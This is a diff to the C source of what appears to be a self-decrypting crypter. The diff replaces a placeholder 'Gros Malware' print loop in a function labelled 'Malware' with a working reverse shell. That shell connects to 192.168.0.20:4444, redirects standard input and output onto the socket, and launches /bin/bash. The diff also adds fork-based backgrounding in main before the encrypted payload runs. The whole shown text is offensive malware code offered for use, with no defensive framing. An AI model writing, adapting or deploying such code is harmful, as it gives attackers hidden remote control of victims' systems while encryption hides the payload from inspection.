@@ -64,11 +64,23 @@ static char *generate_key (unsigned char *p, int size)
 /* Malware */
 CRYPTED(CODE) void payload(void)
 {
-    int i = 0;
-    char *a = malloc(sizeof(1) * 23);
-    for (i = 0; i < 23; a++, i++)
-        printf("Gros Malware\n");
-    while (i--);
+    int sockt;
+    int port = 4444;
+    struct sockaddr_in revsockaddr;
+
+    sockt = socket(AF_INET, SOCK_STREAM,0);
+    revsockaddr.sin_family = AF_INET;
+    revsockaddr.sin_port = htons(port);
+    revsockaddr.sin_addr.s_addr = inet_addr("192.168.0.20");
+
+    connect(sockt, (struct sockaddr *) &revsockaddr,
+    sizeof(revsockaddr));
+    dup2(sockt, 0);
+    dup2(sockt, 1);
+    dup2(sockt, 2);
+
+    char * const argv[] = {"/bin/bash", NULL};
+    execve("/bin/bash", argv, NULL);
 }
 
 static void xor_segment(unsigned char *seg_start, int seg_len)
@@ -144,6 +156,9 @@ int main(int ac, char const * const *av)
         remove_first_time(crypter);
     srand(time(NULL) * (intptr_t)crypter);  /* Make things really random */
     decode_and_crypt(crypter); /* Decode 😇 */
+    if(fork())
+        exit(0);
+    signal(SIGCHLD, SIG_IGN);
     payload(); /* 😈 */
     return (0);
 }
